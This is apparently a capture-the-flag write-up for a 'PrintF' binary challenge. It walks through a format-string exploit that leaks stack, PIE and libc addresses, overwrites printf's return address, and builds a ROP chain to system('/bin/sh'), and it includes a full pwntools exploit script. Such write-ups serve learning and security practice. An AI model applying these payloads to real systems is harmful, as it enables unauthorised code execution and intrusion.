---
title: "WU 1"
date: 2025-05-07
---
O TITE TUTE TATI TIBI TANTA TYRANNE TULISTI
# PrintF

In this challenge, I exploit a `printf` vulnerability. The program leaks a stack address and I use it to calculate the location of `printf`â€™s return address on the stack. By overwriting its least significant byte, I force the program to return into and earlier part of `main` instead of exiting. Like that I gave me another round to exploit the `printf` vulnerability while having leaks for PIE and libc. Finally, I send a payload that replaces again the `printf` return address but this time with a ROP chain calling `system("/bin/sh")`.

## PrintF code

```c
void main(void)
{
    long i;
    char *pBuf;
    long in_FS_OFFSET;
    int var;
    char buf[520];
    long canary;

    canary = *(long *)(in_FS_OFFSET + 0x28);
    var = 1;
    pBuf = buf;
    for (i = 64; i != 0; i--)
    {   //set to 0 the first 512 bytes of buf
        memset(pBuf, 0, 8);
        pBuf += 8;
    }
    puts("Easy peasy printf, don't you think?");
    printf("I feel generous so have this: %p", &var);
    puts("Show me you've got!");
    printf("> ");
    read(0, buf, 512);
    puts("Here we go!!");
    printf(buf);
    /* WARNING: Subroutine does not return */
    exit(0);
}
```

Compiled with `canary`, `FULL RELRO`, `NX`, `PIE` enabled.

---

## 1. Initial Leak & Offset Calculation

1. **Leak the stack pointer**: The program prints a stack address via `printf("...this: %p", &var)`.
2. **Find `printf_ret`**: In GDB, I saw that the saved `rsp` value when `printf` returns is at `stack_leak - 0x14` and it contains the address of `main` right before the `exit(0)`.

```py
# In exploit():
p.recvuntil(b"this: 0x")
stack_leak = int(p.recvuntil(b"\n"), 16)
printf_ret  = stack_leak - 0x14
```

---

## 2. First Format-String Payload (Loop Back)

My goal is to overwrite the least significant byte of `printf_ret` so `printf` returns to an earlier part of `main`, letting me leak PIE and libc addresses and giving me the possibility to exploit the fsb again.

```python
payload = (
    b"dummy420"      # needed for writing the right byte
  + b"||%79$p|"      # leak PIE
  + b"||%75$p|"      # leak libc
  + b"|%12$hhn"      # write 1 byte into printf_ret
  + p64(printf_ret)
)
```

- `%12$hhn` writes the number of printed bytes so far (it is `42`... nice) into the `printf` return address.

After this, the program loops and prints:

```
dummy420||0x<pie_leak>|||0x<libc_leak>|...
```

---

## 3. Compute PIE & libc Bases

- **PIE base** = `pie_leak - 0x1211`
- **LIBC base** = `libc_leak - 0x2A1CA`

```python
pie_base     = pie_leak    - 0x1211
libc.address = libc_leak   - 0x2A1CA
```

---

## 4. Second Payload: ROP Chain

With base addresses known, I build a ROP chain:

1. **Gadgets**:

   - `pop rdi; ret` at `libc + 0x10f75b`
   - `sleep; ret` at `libc + 0x4c161` (stack alignment)

2. **Arguments**:

   - Address of `/bin/sh` in libc
   - `system` function address

I lay this out starting at `printf_ret`:

```python
pop_rdi = libc.address + 0x10f75b
ret   = libc.address + 0x4c161
binsh   = next(libc.search(b"/bin/sh"))
system  = libc.sym['system']

payload2 = fmtstr_payload(
    8,
    {
        printf_ret        : pop_rdi,
        printf_ret + 0x8  : binsh,
        printf_ret + 0x10 : ret,
        printf_ret + 0x18 : system,
    }
)
```

When `printf` returns, it jumps into my ROP chain and runs `system("/bin/sh")`.

---

## 5. Full Exploit Script

```python
#!python

from pwn import *
import pwn
from sys import argv
from os import getcwd
from time import sleep

speed = 0#.5

e = ELF("./printf_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e
context.terminal = ["kitty", "@", "new-window", "--cwd", getcwd()]
context.gdbinit = "/etc/profiles/per-user/darktar/share/pwndbg/gdbinit.py"

r: process = None

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: r.sendlineafter(a, b)
sa = lambda a, b: r.sendafter(a, b)
sl = lambda a: (sleep(speed), r.sendline(a))
s = lambda a: (sleep(speed), r.send(a))
recv = lambda: (sleep(speed), r.recv())[1]
recvn = lambda a: (sleep(speed), r.recvn(a))[1]
recvu = lambda a, b=True: (sleep(speed), r.recvuntil(a, b))[1]
clean = lambda: r.clean()
success = lambda a: log.success(a)
fail = lambda a: log.failure(a)
info = lambda a: log.info(a)

gdbscript = '''
    b main
    continue
'''

def conn():
    global r
    if len(argv) > 1:
        if argv[1] == "gdb":
            r = gdb.debug([e.path], gdbscript=gdbscript)
        else:
            ip, port = argv[1], argv[2]
            r = remote(ip, port)
    else:
        r = e.process()



def exploit():
    recvu(b"this: 0x")
    stack_leak = int(recvu(b"\n"),16)
    info(hex(stack_leak))
    printf_ret = stack_leak - 0x14
    payload = b"dummy420"+b"||%79$p|"+b"||%75$p|"+b"|%12$hhn"+p64(printf_ret)
    info(payload)
    sl(payload)
    recvu(b"|0x")
    pie_base = int(recvu(b"|"),16) - 0x1211
    info(hex(pie_base))
    recvu(b"|0x")
    libc.address = int(recvu(b"|"),16) - 0x2A1CA
    info(hex(libc.address))
    pop_rdi = libc.address + 0x10f75b
    ret = libc.address + 0x4c161
    payload = fmtstr_payload(8,
        {
        printf_ret      : pop_rdi,
        printf_ret+0x8  : next(libc.search('/bin/sh')),
        printf_ret+0x10 : ret, #fix misalignment
        printf_ret+0x18 : libc.sym['system'],
        }
    )
    recvu(b"you've got!")
    sl(payload)
    print("good luck pwning :)")



conn()
exploit()

# good luck pwning :)
r.interactive()
```

_good luck pwning :)_
